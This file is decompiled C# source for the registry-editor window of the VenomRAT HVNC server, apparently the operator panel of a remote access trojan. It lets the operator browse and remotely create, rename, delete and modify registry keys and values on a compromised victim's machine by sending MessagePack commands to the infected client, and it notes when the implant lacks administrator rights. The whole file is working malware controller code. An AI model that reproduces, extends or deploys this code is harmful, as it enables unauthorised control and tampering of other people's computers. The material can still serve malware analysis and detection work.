using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Server.Forms
{
    // Token: 0x0200008B RID: 139
    public partial class FormRegistryEditor : Form
    {
        // Token: 0x170000E2 RID: 226
        // (get) Token: 0x0600052D RID: 1325 RVA: 0x0003E115 File Offset: 0x0003E115
        // (set) Token: 0x0600052E RID: 1326 RVA: 0x0003E11D File Offset: 0x0003E11D
        public Form1 F { get; set; }

        // Token: 0x170000E3 RID: 227
        // (get) Token: 0x0600052F RID: 1327 RVA: 0x0003E126 File Offset: 0x0003E126
        // (set) Token: 0x06000530 RID: 1328 RVA: 0x0003E12E File Offset: 0x0003E12E
        internal Clients Client { get; set; }

        // Token: 0x170000E4 RID: 228
        // (get) Token: 0x06000531 RID: 1329 RVA: 0x0003E137 File Offset: 0x0003E137
        // (set) Token: 0x06000532 RID: 1330 RVA: 0x0003E13F File Offset: 0x0003E13F
        internal Clients ParentClient { get; set; }

        // Token: 0x06000533 RID: 1331 RVA: 0x0003E148 File Offset: 0x0003E148
        public FormRegistryEditor()
        {
            this.InitializeComponent();
        }

        // Token: 0x06000534 RID: 1332 RVA: 0x0003E156 File Offset: 0x0003E156
        private void FrmRegistryEditor_Load(object sender, EventArgs e)
        {
            if (!this.ParentClient.Admin)
            {
                MessageBox.Show("The client software is not running as administrator and therefore some functionality like Update, Create, Open and Delete may not work properly!", "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        // Token: 0x06000535 RID: 1333 RVA: 0x0003E178 File Offset: 0x0003E178
        private void AddRootKey(RegistrySeeker.RegSeekerMatch match)
        {
            TreeNode treeNode = this.CreateNode(match.Key, match.Key, match.Data);
            treeNode.Nodes.Add(new TreeNode());
            this.tvRegistryDirectory.Nodes.Add(treeNode);
        }

        // Token: 0x06000536 RID: 1334 RVA: 0x0003E1C4 File Offset: 0x0003E1C4
        private TreeNode AddKeyToTree(TreeNode parent, RegistrySeeker.RegSeekerMatch subKey)
        {
            TreeNode treeNode = this.CreateNode(subKey.Key, subKey.Key, subKey.Data);
            parent.Nodes.Add(treeNode);
            if (subKey.HasSubKeys)
            {
                treeNode.Nodes.Add(new TreeNode());
            }
            return treeNode;
        }

        // Token: 0x06000537 RID: 1335 RVA: 0x0003E211 File Offset: 0x0003E211
        private TreeNode CreateNode(string key, string text, object tag)
        {
            return new TreeNode
            {
                Text = text,
                Name = key,
                Tag = tag
            };
        }

        // Token: 0x06000538 RID: 1336 RVA: 0x0003E230 File Offset: 0x0003E230
        public void AddKeys(string rootKey, RegistrySeeker.RegSeekerMatch[] matches)
        {
            if (string.IsNullOrEmpty(rootKey))
            {
                this.tvRegistryDirectory.BeginUpdate();
                foreach (RegistrySeeker.RegSeekerMatch match in matches)
                {
                    this.AddRootKey(match);
                }
                this.tvRegistryDirectory.SelectedNode = this.tvRegistryDirectory.Nodes[0];
                this.tvRegistryDirectory.EndUpdate();
                return;
            }
            TreeNode treeNode = this.GetTreeNode(rootKey);
            if (treeNode != null)
            {
                this.tvRegistryDirectory.BeginUpdate();
                foreach (RegistrySeeker.RegSeekerMatch subKey in matches)
                {
                    this.AddKeyToTree(treeNode, subKey);
                }
                treeNode.Expand();
                this.tvRegistryDirectory.EndUpdate();
            }
        }

        // Token: 0x06000539 RID: 1337 RVA: 0x0003E2E4 File Offset: 0x0003E2E4
        public void CreateNewKey(string rootKey, RegistrySeeker.RegSeekerMatch match)
        {
            TreeNode treeNode = this.GetTreeNode(rootKey);
            TreeNode treeNode2 = this.AddKeyToTree(treeNode, match);
            treeNode2.EnsureVisible();
            this.tvRegistryDirectory.SelectedNode = treeNode2;
            treeNode2.Expand();
            this.tvRegistryDirectory.LabelEdit = true;
            treeNode2.BeginEdit();
        }

        // Token: 0x0600053A RID: 1338 RVA: 0x0003E32C File Offset: 0x0003E32C
        public void DeleteKey(string rootKey, string subKey)
        {
            TreeNode treeNode = this.GetTreeNode(rootKey);
            if (treeNode.Nodes.ContainsKey(subKey))
            {
                treeNode.Nodes.RemoveByKey(subKey);
            }
        }

        // Token: 0x0600053B RID: 1339 RVA: 0x0003E35C File Offset: 0x0003E35C
        public void RenameKey(string rootKey, string oldName, string newName)
        {
            TreeNode treeNode = this.GetTreeNode(rootKey);
            if (treeNode.Nodes.ContainsKey(oldName))
            {
                treeNode.Nodes[oldName].Text = newName;
                treeNode.Nodes[oldName].Name = newName;
                this.tvRegistryDirectory.SelectedNode = treeNode.Nodes[newName];
            }
        }

        // Token: 0x0600053C RID: 1340 RVA: 0x0003E3BC File Offset: 0x0003E3BC
        private TreeNode GetTreeNode(string path)
        {
            string[] array = path.Split(new char[] { '\\' });
            TreeNode treeNode = this.tvRegistryDirectory.Nodes[array[0]];
            if (treeNode == null)
            {
                return null;
            }
            for (int i = 1; i < array.Length; i++)
            {
                treeNode = treeNode.Nodes[array[i]];
                if (treeNode == null)
                {
                    return null;
                }
            }
            return treeNode;
        }

        // Token: 0x0600053D RID: 1341 RVA: 0x0003E418 File Offset: 0x0003E418
        public void CreateValue(string keyPath, RegistrySeeker.RegValueData value)
        {
            TreeNode treeNode = this.GetTreeNode(keyPath);
            if (treeNode != null)
            {
                List<RegistrySeeker.RegValueData> list = ((RegistrySeeker.RegValueData[])treeNode.Tag).ToList<RegistrySeeker.RegValueData>();
                list.Add(value);
                treeNode.Tag = list.ToArray();
                if (this.tvRegistryDirectory.SelectedNode == treeNode)
                {
                    RegistryValueLstItem registryValueLstItem = new RegistryValueLstItem(value);
                    this.lstRegistryValues.Items.Add(registryValueLstItem);
                    this.lstRegistryValues.SelectedIndices.Clear();
                    registryValueLstItem.Selected = true;
                    this.lstRegistryValues.LabelEdit = true;
                    registryValueLstItem.BeginEdit();
                }
                this.tvRegistryDirectory.SelectedNode = treeNode;
            }
        }

        // Token: 0x0600053E RID: 1342 RVA: 0x0003E4B4 File Offset: 0x0003E4B4
        public void DeleteValue(string keyPath, string valueName)
        {
            TreeNode treeNode = this.GetTreeNode(keyPath);
            if (treeNode != null)
            {
                if (!RegValueHelper.IsDefaultValue(valueName))
                {
                    treeNode.Tag = (from value in (RegistrySeeker.RegValueData[])treeNode.Tag
                                    where value.Name != valueName
                                    select value).ToArray<RegistrySeeker.RegValueData>();
                    if (this.tvRegistryDirectory.SelectedNode == treeNode)
                    {
                        this.lstRegistryValues.Items.RemoveByKey(valueName);
                    }
                }
                else
                {
                    RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == valueName);
                    if (this.tvRegistryDirectory.SelectedNode == treeNode)
                    {
                        RegistryValueLstItem registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == valueName);
                        if (registryValueLstItem != null)
                        {
                            registryValueLstItem.Data = regValueData.Kind.RegistryTypeToString(null);
                        }
                    }
                }
                this.tvRegistryDirectory.SelectedNode = treeNode;
            }
        }

        // Token: 0x0600053F RID: 1343 RVA: 0x0003E5A4 File Offset: 0x0003E5A4
        public void RenameValue(string keyPath, string oldName, string newName)
        {
            TreeNode treeNode = this.GetTreeNode(keyPath);
            if (treeNode != null)
            {
                RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == oldName);
                regValueData.Name = newName;
                if (this.tvRegistryDirectory.SelectedNode == treeNode)
                {
                    RegistryValueLstItem registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == oldName);
                    if (registryValueLstItem != null)
                    {
                        registryValueLstItem.RegName = newName;
                    }
                }
                this.tvRegistryDirectory.SelectedNode = treeNode;
            }
        }

        // Token: 0x06000540 RID: 1344 RVA: 0x0003E634 File Offset: 0x0003E634
        public void ChangeValue(string keyPath, RegistrySeeker.RegValueData value)
        {
            TreeNode treeNode = this.GetTreeNode(keyPath);
            if (treeNode != null)
            {
                RegistrySeeker.RegValueData dest = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == value.Name);
                this.ChangeRegistryValue(value, dest);
                if (this.tvRegistryDirectory.SelectedNode == treeNode)
                {
                    RegistryValueLstItem registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == value.Name);
                    if (registryValueLstItem != null)
                    {
                        registryValueLstItem.Data = RegValueHelper.RegistryValueToString(value);
                    }
                }
                this.tvRegistryDirectory.SelectedNode = treeNode;
            }
        }

        // Token: 0x06000541 RID: 1345 RVA: 0x0003E6D3 File Offset: 0x0003E6D3
        private void ChangeRegistryValue(RegistrySeeker.RegValueData source, RegistrySeeker.RegValueData dest)
        {
            if (source.Kind != dest.Kind)
            {
                return;
            }
            dest.Data = source.Data;
        }

        // Token: 0x06000542 RID: 1346 RVA: 0x0003E6F0 File Offset: 0x0003E6F0
        private void UpdateLstRegistryValues(TreeNode node)
        {
            this.selectedStripStatusLabel.Text = node.FullPath;
            RegistrySeeker.RegValueData[] values = (RegistrySeeker.RegValueData[])node.Tag;
            this.PopulateLstRegistryValues(values);
        }

        // Token: 0x06000543 RID: 1347 RVA: 0x0003E724 File Offset: 0x0003E724
        private void PopulateLstRegistryValues(RegistrySeeker.RegValueData[] values)
        {
            this.lstRegistryValues.BeginUpdate();
            this.lstRegistryValues.Items.Clear();
            values = (from value in values
                      orderby value.Name
                      select value).ToArray<RegistrySeeker.RegValueData>();
            foreach (RegistrySeeker.RegValueData value3 in values)
            {
                RegistryValueLstItem value2 = new RegistryValueLstItem(value3);
                this.lstRegistryValues.Items.Add(value2);
            }
            this.lstRegistryValues.EndUpdate();
        }

        // Token: 0x06000544 RID: 1348 RVA: 0x0003E7B0 File Offset: 0x0003E7B0
        private void tvRegistryDirectory_AfterLabelEdit(object sender, NodeLabelEditEventArgs e)
        {
            if (e.Label == null)
            {
                this.tvRegistryDirectory.LabelEdit = false;
                return;
            }
            e.CancelEdit = true;
            if (e.Label.Length <= 0)
            {
                MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                e.Node.BeginEdit();
                return;
            }
            if (e.Node.Parent.Nodes.ContainsKey(e.Label))
            {
                MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                e.Node.BeginEdit();
                return;
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "RenameRegistryKey";
            msgPack.ForcePathObject("OldKeyName").AsString = e.Node.Name;
            msgPack.ForcePathObject("NewKeyName").AsString = e.Label;
            msgPack.ForcePathObject("ParentPath").AsString = e.Node.Parent.FullPath;
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            this.tvRegistryDirectory.LabelEdit = false;
        }

        // Token: 0x06000545 RID: 1349 RVA: 0x0003E8F4 File Offset: 0x0003E8F4
        private void tvRegistryDirectory_BeforeExpand(object sender, TreeViewCancelEventArgs e)
        {
            TreeNode node = e.Node;
            if (string.IsNullOrEmpty(node.FirstNode.Name))
            {
                this.tvRegistryDirectory.SuspendLayout();
                node.Nodes.Clear();
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "LoadRegistryKey";
                msgPack.ForcePathObject("RootKeyName").AsString = node.FullPath;
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                Thread.Sleep(500);
                this.tvRegistryDirectory.ResumeLayout();
                e.Cancel = true;
            }
        }

        // Token: 0x06000546 RID: 1350 RVA: 0x0003E9B4 File Offset: 0x0003E9B4
        private void tvRegistryDirectory_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                this.tvRegistryDirectory.SelectedNode = e.Node;
                Point position = new Point(e.X, e.Y);
                this.CreateTreeViewMenuStrip();
                this.tv_ContextMenuStrip.Show(this.tvRegistryDirectory, position);
            }
        }

        // Token: 0x06000547 RID: 1351 RVA: 0x0003EA0A File Offset: 0x0003EA0A
        private void tvRegistryDirectory_BeforeSelect(object sender, TreeViewCancelEventArgs e)
        {
            this.UpdateLstRegistryValues(e.Node);
        }

        // Token: 0x06000548 RID: 1352 RVA: 0x0003EA18 File Offset: 0x0003EA18
        private void tvRegistryDirectory_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete && this.GetDeleteState())
            {
                this.deleteRegistryKey_Click(this, e);
            }
        }

        // Token: 0x06000549 RID: 1353 RVA: 0x0003EA34 File Offset: 0x0003EA34
        private void CreateEditToolStrip()
        {
            this.modifyToolStripMenuItem1.Visible = (this.modifyBinaryDataToolStripMenuItem1.Visible = (this.modifyNewtoolStripSeparator.Visible = this.lstRegistryValues.Focused));
            this.modifyToolStripMenuItem1.Enabled = (this.modifyBinaryDataToolStripMenuItem1.Enabled = this.lstRegistryValues.SelectedItems.Count == 1);
            this.renameToolStripMenuItem2.Enabled = this.GetRenameState();
            this.deleteToolStripMenuItem2.Enabled = this.GetDeleteState();
        }

        // Token: 0x0600054A RID: 1354 RVA: 0x0003EAC1 File Offset: 0x0003EAC1
        private void CreateTreeViewMenuStrip()
        {
            this.renameToolStripMenuItem.Enabled = this.tvRegistryDirectory.SelectedNode.Parent != null;
            this.deleteToolStripMenuItem.Enabled = this.tvRegistryDirectory.SelectedNode.Parent != null;
        }

        // Token: 0x0600054B RID: 1355 RVA: 0x0003EB00 File Offset: 0x0003EB00
        private void CreateListViewMenuStrip()
        {
            this.modifyToolStripMenuItem.Enabled = (this.modifyBinaryDataToolStripMenuItem.Enabled = this.lstRegistryValues.SelectedItems.Count == 1);
            this.renameToolStripMenuItem1.Enabled = this.lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(this.lstRegistryValues.SelectedItems[0].Name);
            this.deleteToolStripMenuItem1.Enabled = this.tvRegistryDirectory.SelectedNode != null && this.lstRegistryValues.SelectedItems.Count > 0;
        }

        // Token: 0x0600054C RID: 1356 RVA: 0x0003EBA6 File Offset: 0x0003EBA6
        private void editToolStripMenuItem_DropDownOpening(object sender, EventArgs e)
        {
            this.CreateEditToolStrip();
        }

        // Token: 0x0600054D RID: 1357 RVA: 0x0003C4E3 File Offset: 0x0003C4E3
        private void menuStripExit_Click(object sender, EventArgs e)
        {
            base.Close();
        }

        // Token: 0x0600054E RID: 1358 RVA: 0x0003EBAE File Offset: 0x0003EBAE
        private void menuStripDelete_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.Focused)
            {
                this.deleteRegistryKey_Click(this, e);
                return;
            }
            if (this.lstRegistryValues.Focused)
            {
                this.deleteRegistryValue_Click(this, e);
            }
        }

        // Token: 0x0600054F RID: 1359 RVA: 0x0003EBDB File Offset: 0x0003EBDB
        private void menuStripRename_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.Focused)
            {
                this.renameRegistryKey_Click(this, e);
                return;
            }
            if (this.lstRegistryValues.Focused)
            {
                this.renameRegistryValue_Click(this, e);
            }
        }

        // Token: 0x06000550 RID: 1360 RVA: 0x0003EC08 File Offset: 0x0003EC08
        private void lstRegistryKeys_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                Point position = new Point(e.X, e.Y);
                if (this.lstRegistryValues.GetItemAt(position.X, position.Y) == null)
                {
                    this.lst_ContextMenuStrip.Show(this.lstRegistryValues, position);
                    return;
                }
                this.CreateListViewMenuStrip();
                this.selectedItem_ContextMenuStrip.Show(this.lstRegistryValues, position);
            }
        }

        // Token: 0x06000551 RID: 1361 RVA: 0x0003EC7C File Offset: 0x0003EC7C
        private void lstRegistryKeys_AfterLabelEdit(object sender, LabelEditEventArgs e)
        {
            if (e.Label == null || this.tvRegistryDirectory.SelectedNode == null)
            {
                this.lstRegistryValues.LabelEdit = false;
                return;
            }
            e.CancelEdit = true;
            int item = e.Item;
            if (e.Label.Length <= 0)
            {
                MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                this.lstRegistryValues.Items[item].BeginEdit();
                return;
            }
            if (this.lstRegistryValues.Items.ContainsKey(e.Label))
            {
                MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                this.lstRegistryValues.Items[item].BeginEdit();
                return;
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "RenameRegistryValue";
            msgPack.ForcePathObject("OldValueName").AsString = this.lstRegistryValues.Items[item].Name;
            msgPack.ForcePathObject("NewValueName").AsString = e.Label;
            msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            this.lstRegistryValues.LabelEdit = false;
        }

        // Token: 0x06000552 RID: 1362 RVA: 0x0003EDF1 File Offset: 0x0003EDF1
        private void lstRegistryKeys_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete && this.GetDeleteState())
            {
                this.deleteRegistryValue_Click(this, e);
            }
        }

        // Token: 0x06000553 RID: 1363 RVA: 0x0003EE10 File Offset: 0x0003EE10
        private void createNewRegistryKey_Click(object sender, EventArgs e)
        {
            if (!this.tvRegistryDirectory.SelectedNode.IsExpanded && this.tvRegistryDirectory.SelectedNode.Nodes.Count > 0)
            {
                this.tvRegistryDirectory.AfterExpand += this.createRegistryKey_AfterExpand;
                this.tvRegistryDirectory.SelectedNode.Expand();
                return;
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "CreateRegistryKey";
            msgPack.ForcePathObject("ParentPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x06000554 RID: 1364 RVA: 0x0003EEDC File Offset: 0x0003EEDC
        private void deleteRegistryKey_Click(object sender, EventArgs e)
        {
            string text = "Are you sure you want to permanently delete this key and all of its subkeys?";
            string caption = "Confirm Key Delete";
            DialogResult dialogResult = MessageBox.Show(text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
            if (dialogResult == DialogResult.Yes)
            {
                string fullPath = this.tvRegistryDirectory.SelectedNode.Parent.FullPath;
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "DeleteRegistryKey";
                msgPack.ForcePathObject("KeyName").AsString = this.tvRegistryDirectory.SelectedNode.Name;
                msgPack.ForcePathObject("ParentPath").AsString = fullPath;
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        // Token: 0x06000555 RID: 1365 RVA: 0x0003EFA1 File Offset: 0x0003EFA1
        private void renameRegistryKey_Click(object sender, EventArgs e)
        {
            this.tvRegistryDirectory.LabelEdit = true;
            this.tvRegistryDirectory.SelectedNode.BeginEdit();
        }

        // Token: 0x06000556 RID: 1366 RVA: 0x0003EFC0 File Offset: 0x0003EFC0
        private void createStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.SelectedNode != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                msgPack.ForcePathObject("Kindstring").AsString = "1";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        // Token: 0x06000557 RID: 1367 RVA: 0x0003F060 File Offset: 0x0003F060
        private void createBinaryRegistryValue_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.SelectedNode != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                msgPack.ForcePathObject("Kindstring").AsString = "3";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        // Token: 0x06000558 RID: 1368 RVA: 0x0003F100 File Offset: 0x0003F100
        private void createDwordRegistryValue_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.SelectedNode != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                msgPack.ForcePathObject("Kindstring").AsString = "4";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        // Token: 0x06000559 RID: 1369 RVA: 0x0003F1A0 File Offset: 0x0003F1A0
        private void createQwordRegistryValue_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.SelectedNode != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                msgPack.ForcePathObject("Kindstring").AsString = "11";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        // Token: 0x0600055A RID: 1370 RVA: 0x0003F240 File Offset: 0x0003F240
        private void createMultiStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.SelectedNode != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                msgPack.ForcePathObject("Kindstring").AsString = "7";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        // Token: 0x0600055B RID: 1371 RVA: 0x0003F2E0 File Offset: 0x0003F2E0
        private void createExpandStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.SelectedNode != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                msgPack.ForcePathObject("Kindstring").AsString = "2";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        // Token: 0x0600055C RID: 1372 RVA: 0x0003F380 File Offset: 0x0003F380
        private void deleteRegistryValue_Click(object sender, EventArgs e)
        {
            string text = "Deleting certain registry values could cause system instability. Are you sure you want to permanently delete " + ((this.lstRegistryValues.SelectedItems.Count == 1) ? "this value?" : "these values?");
            string caption = "Confirm Value Delete";
            DialogResult dialogResult = MessageBox.Show(text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
            if (dialogResult == DialogResult.Yes)
            {
                foreach (object obj in this.lstRegistryValues.SelectedItems)
                {
                    if (obj.GetType() == typeof(RegistryValueLstItem))
                    {
                        RegistryValueLstItem registryValueLstItem = (RegistryValueLstItem)obj;
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                        msgPack.ForcePathObject("Command").AsString = "DeleteRegistryValue";
                        msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                        msgPack.ForcePathObject("ValueName").AsString = registryValueLstItem.RegName;
                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                    }
                }
            }
        }

        // Token: 0x0600055D RID: 1373 RVA: 0x0003F4CC File Offset: 0x0003F4CC
        private void renameRegistryValue_Click(object sender, EventArgs e)
        {
            this.lstRegistryValues.LabelEdit = true;
            this.lstRegistryValues.SelectedItems[0].BeginEdit();
        }

        // Token: 0x0600055E RID: 1374 RVA: 0x0003F4F0 File Offset: 0x0003F4F0
        private void modifyRegistryValue_Click(object sender, EventArgs e)
        {
            this.CreateEditForm(false);
        }

        // Token: 0x0600055F RID: 1375 RVA: 0x0003F4F9 File Offset: 0x0003F4F9
        private void modifyBinaryDataRegistryValue_Click(object sender, EventArgs e)
        {
            this.CreateEditForm(true);
        }

        // Token: 0x06000560 RID: 1376 RVA: 0x0003F502 File Offset: 0x0003F502
        private void createRegistryKey_AfterExpand(object sender, TreeViewEventArgs e)
        {
            if (e.Node == this.tvRegistryDirectory.SelectedNode)
            {
                this.createNewRegistryKey_Click(this, e);
                this.tvRegistryDirectory.AfterExpand -= this.createRegistryKey_AfterExpand;
            }
        }

        // Token: 0x06000561 RID: 1377 RVA: 0x0003F538 File Offset: 0x0003F538
        private bool GetDeleteState()
        {
            if (this.lstRegistryValues.Focused)
            {
                return this.lstRegistryValues.SelectedItems.Count > 0;
            }
            return this.tvRegistryDirectory.Focused && this.tvRegistryDirectory.SelectedNode != null && this.tvRegistryDirectory.SelectedNode.Parent != null;
        }

        // Token: 0x06000562 RID: 1378 RVA: 0x0003F598 File Offset: 0x0003F598
        private bool GetRenameState()
        {
            if (this.lstRegistryValues.Focused)
            {
                return this.lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(this.lstRegistryValues.SelectedItems[0].Name);
            }
            return this.tvRegistryDirectory.Focused && this.tvRegistryDirectory.SelectedNode != null && this.tvRegistryDirectory.SelectedNode.Parent != null;
        }

        // Token: 0x06000563 RID: 1379 RVA: 0x0003F618 File Offset: 0x0003F618
        private Form GetEditForm(RegistrySeeker.RegValueData value, RegistryValueKind valueKind)
        {
            switch (valueKind)
            {
                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    return new FormRegValueEditString(value);

                case RegistryValueKind.Binary:
                    return new FormRegValueEditBinary(value);

                case RegistryValueKind.DWord:
                case RegistryValueKind.QWord:
                    return new FormRegValueEditWord(value);

                case RegistryValueKind.MultiString:
                    return new FormRegValueEditMultiString(value);
            }
            return null;
        }

        // Token: 0x06000564 RID: 1380 RVA: 0x0003F678 File Offset: 0x0003F678
        private void CreateEditForm(bool isBinary)
        {
            string fullPath = this.tvRegistryDirectory.SelectedNode.FullPath;
            string name = this.lstRegistryValues.SelectedItems[0].Name;
            RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])this.tvRegistryDirectory.SelectedNode.Tag).ToList<RegistrySeeker.RegValueData>().Find((RegistrySeeker.RegValueData item) => item.Name == name);
            RegistryValueKind valueKind = (isBinary ? RegistryValueKind.Binary : regValueData.Kind);
            using (Form editForm = this.GetEditForm(regValueData, valueKind))
            {
                if (editForm.ShowDialog() == DialogResult.OK)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                    msgPack.ForcePathObject("Command").AsString = "ChangeRegistryValue";
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
            }
        }

        // Token: 0x06000565 RID: 1381 RVA: 0x0003F774 File Offset: 0x0003F774
        public void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
                {
                    base.Close();
                }
            }
            catch
            {
                base.Close();
            }
        }

        // Token: 0x06000566 RID: 1382 RVA: 0x0003F7C8 File Offset: 0x0003F7C8
        private void FormRegistryEditor_FormClosed(object sender, FormClosedEventArgs e)
        {
            ThreadPool.QueueUserWorkItem(delegate (object o)
            {
                Clients client = this.Client;
                if (client == null)
                {
                    return;
                }
                client.Disconnected();
            });
        }
    }
}